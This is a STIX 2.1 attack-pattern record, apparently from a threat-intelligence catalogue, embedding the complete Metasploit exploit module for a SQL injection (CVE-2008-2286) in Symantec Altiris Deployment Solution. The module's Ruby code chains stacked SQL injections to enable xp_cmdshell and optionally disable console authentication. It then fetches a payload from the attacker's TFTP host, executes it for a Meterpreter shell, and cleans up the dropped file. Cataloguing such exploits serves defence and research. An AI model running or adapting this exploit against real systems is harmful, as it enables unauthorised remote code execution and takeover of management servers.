{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bb4d2549-7d73-4cb0-8207-b28b5b638ffb",
    "created": "2024-08-14T16:46:41.903754Z",
    "modified": "2024-08-14T16:46:41.903757Z",
    "name": "Symantec Altiris DS SQL Injection",
    "description": " This module exploits a SQL injection flaw in Symantec Altiris Deployment Solution 6.8 to 6.9.164. The vulnerability exists on axengine.exe which fails to adequately sanitize numeric input fields in \"UpdateComputer\" notification Requests. In order to spawn a shell several SQL injections are required in close succession, first to enable xp_cmdshell, then retrieve the payload via TFTP and finally execute it. The module also has the capability to disable or enable local application authentication. In order to work the target system must have a tftp client available. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/altiris_ds_sqli.rb",
            "external_id": "altiris_ds_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2286"
        },
        {
            "source_name": "reference",
            "url": "http://www.zerodayinitiative.com/advisories/ZDI-08-024"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Symantec Altiris DS SQL Injection',\n        'Description' => %q{\n          This module exploits a SQL injection flaw in Symantec Altiris Deployment Solution 6.8\n          to 6.9.164. The vulnerability exists on axengine.exe which fails to adequately sanitize\n          numeric input fields in \"UpdateComputer\" notification Requests. In order to spawn a shell,\n          several SQL injections are required in close succession, first to enable xp_cmdshell, then\n          retrieve the payload via TFTP and finally execute it. The module also has the capability\n          to disable or enable local application authentication. In order to work the target system\n          must have a tftp client available.\n        },\n        'Author' => [\n          'Brett Moore', # Vulnerability discovery\n          '3v0lver' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2008-2286' ],\n          [ 'OSVDB', '45313' ],\n          [ 'BID', '29198'],\n          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-08-024' ]\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'process',\n        },\n        'Targets' => [\n          [\n            'Windows 2003 (with tftp client available)',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'Platform' => 'win',\n        'DisclosureDate' => '2008-05-15',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n     )\n\n    register_options(\n      [\n        Opt::RPORT(402),\n        OptBool.new('XP_CMDSHELL', [ true, \"Enable xp_cmdshell prior to exploit\", true]),\n        OptBool.new('DISABLE_SECURITY', [ true, \"Exploit SQLi to execute wc_upd_disable_security and disable Console Authentication\", false ]),\n        OptBool.new('ENABLE_SECURITY', [ true, \"Enable Local Deployment Console Authentication\", false ])\n      ]\n    )\n    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n\n    self.needs_cleanup = true\n  end\n\n  def execute_command(cmd, opts = {})\n    inject = []\n\n    if @xp_shell_enable\n      inject += [\n        \"#{Rex::Text.to_hex(\"sp_configure \\\"show advanced options\\\", 1; reconfigure\", '')}\",\n        \"#{Rex::Text.to_hex(\"sp_configure \\\"xp_cmdshell\\\", 1; reconfigure\", '')}\",\n      ]\n      @xp_shell_enable = false\n    end\n\n    if @wc_disable_security\n      inject += [\"#{Rex::Text.to_hex(\"wc_upd_disable_security\", '')}\"]\n      @wc_disable_security = false\n    end\n\n    if @wc_enable_security\n      inject += [\"#{Rex::Text.to_hex(\"wc_upd_enable_security\", '')}\"]\n      @wc_enable_security = false\n    end\n\n    inject += [\"#{Rex::Text.to_hex(\"master.dbo.xp_cmdshell \\'cd %TEMP% && cmd.exe /c #{cmd}\\'\", '')}\"] if cmd != nil\n\n    inject.each do |sqli|\n      send_update_computer(\"2659, null, null;declare @querya VARCHAR(255);select @querya = 0x#{sqli};exec(@querya);--\")\n    end\n  end\n\n  def send_update_computer(processor_speed)\n    notification = %Q|Request=UpdateComputer\nOS-Bit=32\nCPU-Arch=x86\nIP-Address=192.168.20.107\nMAC-Address=005056C000AB\nName=Remove_test\nOS=Windows XP\nVersion=2.6-38 (32-Bit)\nLoggedIn=Yes\nBoot-Env=Automation\nPlatform=Linux\nAgent-Settings=Same\nSys-Info-TimeZoneBias=0\nProcessor=Genuine Intel Intel(R) Core(TM) i7 CPU M 620 @ 2.67GHz\nProcessor-Speed=#{processor_speed}\n   \\x00\n   |\n\n    connect\n    sock.put(notification)\n    response = sock.get_once()\n    disconnect\n\n    return response\n  end\n\n  def check\n    res = send_update_computer(\"2659\")\n\n    unless res and res =~ /Result=Success/ and res =~ /DSVersion=(.*)/\n      return Exploit::CheckCode::Unknown\n    end\n\n    version = $1\n\n    unless version =~ /^6\\.(\\d+)\\.(\\d+)$/\n      return Exploit::CheckCode::Safe\n    end\n\n    vprint_status \"#{rhost}:#{rport} - Altiris DS Version '#{version}'\"\n\n    minor = $1.to_i\n    build = $2.to_i\n\n    if minor == 8\n      if build == 206 || build == 282 || build == 378\n        return Exploit::CheckCode::Appears\n      elsif build < 390\n        return Exploit::CheckCode::Appears\n      end\n    elsif minor == 9 and build < 176\n      # The existence of versions matching this profile is a possibility... none were observed in the wild though\n      # as such, we're basing confidence off of Symantec's vulnerability bulletin.\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    @wc_disable_security = datastore['DISABLE_SECURITY']\n    @wc_enable_security = datastore['ENABLE_SECURITY']\n    @xp_shell_enable = datastore['XP_CMDSHELL']\n\n    # CmdStagerVBS was tested here as well, however delivery took roughly\n    # 30 minutes and required sending almost 350 notification messages.\n    # size constraint requirement for SQLi is: linemax => 393\n    tftphost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    execute_cmdstager({ delay: 1.5, tftphost: tftphost, temp: '%TEMP%\\\\', flavor: :tftp })\n  end\n\n  def on_new_session(client)\n    return if not stager_instance.payload_exe\n\n    # can't scrub dropped payload while the process is still active so...\n    # iterate through process list, find our process and the associated\n    # parent process ID, Kill the parent.\n    # This module doesn't use FileDropper because of timing issues when\n    # using migrate -f and FileDropper. On the other hand PrependMigrate\n    # has been avoided because of older issues with reverse_https payload\n\n    unless client.type == \"meterpreter\"\n      print_error(\"Automatic cleanup only available with meterpreter, please delete #{stager_instance.payload_exe} manually\")\n      return\n    end\n\n    client.core.use(\"stdapi\") unless client.ext.aliases.include?(\"stdapi\")\n    # migrate\n    print_status(\"Migrating ...\")\n    client.console.run_single(\"run migrate -f\")\n    # kill the parent process so the payload can hopefully be dropped\n    print_status(\"Kill parent process ...\")\n    client.sys.process.get_processes().each do |proc|\n      if proc['pid'] == client.sys.process.open.pid\n        client.sys.process.kill(proc['ppid'])\n      end\n    end\n\n    win_temp = client.sys.config.getenv('TEMP')\n    win_file = \"#{win_temp}\\\\#{stager_instance.payload_exe}\"\n    print_status(\"Attempting to delete #{win_file} ...\")\n    client.shell_command_token(%Q|attrib.exe -r #{win_file}|)\n    client.fs.file.rm(win_file)\n    print_good(\"Deleted #{win_file}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-05-15",
    "x_mitre_platforms": [
        "win'"
    ]
}